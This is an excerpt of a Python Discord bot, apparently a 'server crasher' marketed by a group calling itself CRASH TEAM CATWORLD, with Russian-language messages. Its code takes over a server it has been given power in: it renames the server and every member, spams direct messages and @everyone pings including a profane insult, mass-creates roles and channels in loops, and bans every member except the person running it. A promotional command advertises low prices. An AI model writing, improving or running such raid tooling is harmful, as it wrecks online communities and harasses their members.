...
# dasdasdasdasdasdasdlkuy2tgfvbnwmskdufygrve3b wms,lcfiurhebwn ams,zxlcfij s,xcfiroaihdibalisdbLABs
...
async def send_event_crasha(ctx, old_name, old_icon_url):
    ...
    await ctx.send(link)
    text1 = (f'SERVER {old_name} CRASHED BY CATWORLD')
    ...
    embed.add_field(name="SERVER CRASHED BY CATWORLD", value=f"Powered by {bot_name}", inline=False)
...
async def start_crash(ctx):
    ...
    time.sleep(1)
    await ctx.send("@everyone ПОШЛА ПИ##А ПО КОЧКАМ")
    await ctx.send(f'@everyone Краш начат by CRASH TEAM CATWORLD!')
    await ctx.author.send(f'Рассылка пользователям началась')
    for member in ctx.guild.members:
        try:
            await member.send(f"Краш начат by CRASH TEAM CATWORLD")
        except:
    ...
    with open('icon.jpg', 'rb') as f:
        icon = f.read()
    await ctx.guild.edit(name=f'Crashed by CRASH TEAM CATWORLD', icon=icon)
    await ctx.author.send("Смена никнейнов пользователей")
    for i in ctx.guild.members:
        try:
            await i.edit(nick=f"Crashed by CRASH TEAM CATWORLD")
        except:
            pass
    try:
        await ctx.author.edit(nick=f'Crasher CRASH TEAM CATWORLD')
    except:
        pass

    try:
        await ctx.me.edit(nick=f'Crasher CRASH TEAM CATWORLD')
    except:
        pass
    ...
    await ctx.author.send(f'Создание каналов и ролей с названием "Crashed by CRASH TEAM CATWORLD"')
    for i in range(40):
        await ctx.guild.create_role(name=f'Crashed by CRASH TEAM CATWORLD')
        await ctx.guild.create_role(name=f'Crashed by CRASH TEAM CATWORLD')
        await ctx.guild.create_role(name=f'Crashed by CRASH TEAM CATWORLD')
        await ctx.guild.create_text_channel(f'Crashed by CRASH TEAM CATWORLD')
        await ctx.guild.create_voice_channel(f"Crashed by CRASH TEAM CATWORLD")
    ...
    for channel in ctx.guild.text_channels:
        ...
        embed.add_field(name=f"Краш by {ctx.message.author}", value='Сервер был крашнут ботом CATWORLD',
                        inline=True),
    ...
    for m in ctx.guild.members:
        if m != ctx.author:
            try:
                await m.send(f"Краш прошел by CRASH TEAM CATWORLD")
                await m.ban(reason="По просьбе CRASH TEAM CATWORLD")
            except:
                pass
...
async def hello(ctx):
    ...
    embed.add_field(name="Функционал", value="У нас есть уникальные функции, которых нет нигде!", inline=True)
    embed.add_field(name="Доступность", value="Низкие цены - наш приоритет", inline=True)
    embed.add_field(name="Безопасность", value="Вы можете обезопасить свой сервер от этого монстра", inline=True)
